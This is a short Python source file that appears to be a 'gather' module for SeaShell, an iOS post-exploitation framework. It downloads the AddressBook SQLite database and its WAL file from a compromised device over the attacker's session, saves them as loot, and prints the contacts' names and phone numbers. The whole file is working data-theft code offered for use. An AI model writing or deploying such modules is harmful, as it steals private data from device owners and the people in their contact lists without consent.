"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

from seashell.lib.loot import Loot

from pex.db import DB

from badges.cmd import Command


class ExternalCommand(Command, DB):
    def __init__(self):
        super().__init__({
            'Category': "gather",
            'Name': "contacts",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "View device contacts.",
            'Usage': "contacts",
            'MinArgs': 0
        })

        self.db_file = '/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb'
        self.wal_file = '/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb-wal'

    def run(self, _):
        if not self.session.download(
                self.db_file, Loot().specific_loot('AddressBook.sqlitedb')):
            return

        if not self.session.download(
                self.wal_file, Loot().specific_loot('AddressBook.sqlitedb-wal')):
            return

        self.print_process("Parsing contacts database...")

        try:
            contacts = self.parse_addressbook(
                Loot().specific_loot('AddressBook.sqlitedb'))
        except Exception:
            self.print_error("Failed to parse contacts database!")
            return

        contacts_data = []
        for item in contacts:
            contacts_data.append((item['c0First'], item['c1Last'], item['c16Phone']))

        if contacts_data:
            self.print_table("Contacts", ('Forename', 'Surname', 'Phone'), *contacts_data)
        else:
            self.print_warning("No contacts available on device.")
